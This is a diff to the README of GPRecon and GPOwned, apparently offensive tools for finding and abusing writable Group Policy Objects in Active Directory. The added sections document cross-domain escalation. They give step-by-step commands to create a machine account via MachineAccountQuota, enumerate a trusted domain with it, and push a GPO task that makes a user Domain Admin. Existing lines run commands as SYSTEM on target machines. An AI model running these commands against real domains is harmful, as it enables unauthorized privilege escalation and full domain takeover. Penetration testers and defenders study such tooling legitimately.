@@ -30,6 +30,7 @@
 - [Requirements](#requirements)
 - [GPRecon](#gprecon)
 - [GPOwned](#gpowned)
+- [Cross-domain / machine account attacks](#cross-domain--machine-account-attacks)
 - [Building from source](#building-from-source)
 - [Credits](#credits)
 
@@ -106,7 +107,7 @@ flowchart TD
 
 ## GPRecon
 
-Enumerates all GPOs via SYSVOL, tests ACLs against the current user, and maps linked OUs. When a writable GPO is found, the identity granting write access is shown inline - sourced from the same ACL read, with no additional LDAP queries.
+Enumerates all GPOs via SYSVOL, tests ACLs against the current user (or supplied credentials), and maps linked OUs. When a writable GPO is found, the identity granting write access is shown inline.
 
 **Example output:**
 
@@ -125,6 +126,8 @@ GPRecon.exe --all --vulnerable
 GPRecon.exe --all --full
 GPRecon.exe --gpo "Default Domain Policy"
 GPRecon.exe --gpo {31B2F340-016D-11D2-945F-00C04FB984F9} --full
+GPRecon.exe --all --domain other.corp.local -u jdoe -pw P@ssw0rd
+GPRecon.exe --all --domain other.corp.local --ma PC01 --mp Sup3rS3cr3t
 ```
 
 ### Flags
@@ -135,6 +138,11 @@ GPRecon.exe --gpo {31B2F340-016D-11D2-945F-00C04FB984F9} --full
 | `--gpo <name\|GUID>` | Check a specific GPO by display name or GUID |
 | `--vulnerable` | Only display writable GPOs - use with `--all` |
 | `--full` | Also enumerate computers in each linked OU |
+| `--domain` / `-d <fqdn>` | Target domain FQDN (default: current domain) |
+| `--username` / `-u <user>` | Username for LDAP + SYSVOL queries |
+| `--password` / `-pw <pass>` | Password for the above user |
+| `--machineaccount` / `--ma <name>` | Machine account name — `$` appended automatically. Accepts `PC01`, `PC01$`, or `DOMAIN\PC01` |
+| `--machinepassword` / `--mp <pass>` | Machine account password. Takes precedence over `--username` |
 
 ---
 
@@ -160,7 +168,7 @@ One is required:
 | `--cmd <args>` | Run `cmd.exe <args>` as SYSTEM |
 | `--ps <cmd>` | Run `powershell.exe <cmd>` as SYSTEM |
 
-> Single quotes in `--cmd` / `--ps` / `--scmd` / `--sps` are converted to double quotes in the generated XML automatically - no manual escaping needed.
+> Single quotes in `--cmd` / `--ps` / `--scmd` / `--sps` are converted to double quotes automatically.
 
 ### Target and identity flags
 
@@ -168,9 +176,25 @@ One is required:
 |------|:--------:|---------|-------------|
 | `--computer` / `-c` | Yes | - | Target machine FQDN |
 | `--user` / `-u` | For `--da` / `--local` | - | User to elevate |
-| `--domain` / `-d` | | Forest root | Domain FQDN |
+| `--domain` / `-d` | | Forest root | Target domain FQDN |
 | `--author` / `-a` | | Auto-detected DA | Account name written to the task `Author` field |
 | `--interval` / `-int` | | 90 | Minutes between execution-verification polls |
+
+### Machine account flags
+
+Use these when you hold credentials for a machine account that has write access to the GPO (e.g. `Authenticated Users` ACE on a cross-domain GPO, combined with `MachineAccountQuota`).
+
+| Flag | Description |
+|------|-------------|
+| `--machineaccount` / `--ma <name>` | Machine account name — `$` appended automatically. Accepts `PC01`, `PC01$`, or `DOMAIN\PC01` |
+| `--machinepassword` / `--mp <pass>` | Machine account password |
+
+When supplied, the tool logs on with these credentials using `LOGON_NEW_CREDENTIALS` (equivalent to `runas /netonly`) before touching AD or SYSVOL. A green confirmation line is printed once the logon token is obtained:
+
+```
+Auth   : PC01$  (machine account)
+Impersonation OK — LDAP and SYSVOL will use PC01$
+```
 
 ### Second-task flags (`--stx`)
 
@@ -212,6 +236,40 @@ GPOwned.exe --guid {D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA} ^
   --computer pc01.corp.local --author DAUser --stx . ^
   --scmd "/r net group 'Domain Admins' jdoe /add /dom"
 ```
+
+**Cross-domain escalation using a machine account:**
+```
+GPOwned.exe --gpo "Workstation Policy" --computer dc01.other.corp ^^
+  --domain other.corp --da --user jdoe ^^
+  --ma PC01 --mp Sup3rS3cr3t
+```
+
+---
+
+## Cross-domain / machine account attacks
+
+A common scenario in multi-domain forests:
+
+1. `Authenticated Users` has write access to a GPO in a trusted domain.
+2. You have `MachineAccountQuota > 0` (default is 10) in that domain, so you can create a machine account.
+3. Machine accounts are members of `Authenticated Users` by default.
+
+**Workflow:**
+
+```
+# 1. Create a machine account in the target domain (e.g. via PowerMad / Impacket)
+New-MachineAccount -MachineAccount PC01 -Password (ConvertTo-SecureString 'Sup3rS3cr3t' -AsPlainText -Force)
+
+# 2. Recon the target domain as that machine account
+GPRecon.exe --all --domain other.corp.local --ma PC01 --mp Sup3rS3cr3t
+
+# 3. Exploit the writable GPO
+GPOwned.exe --gpo "Writable Policy" --computer dc01.other.corp \
+  --domain other.corp.local --da --user jdoe \
+  --ma PC01 --mp Sup3rS3cr3t
+```
+
+Both tools use `LOGON_NEW_CREDENTIALS` internally — the same mechanism as `runas /netonly` — so all outbound LDAP and SYSVOL traffic uses the machine account while the local process identity is unchanged.
 
 ---
 
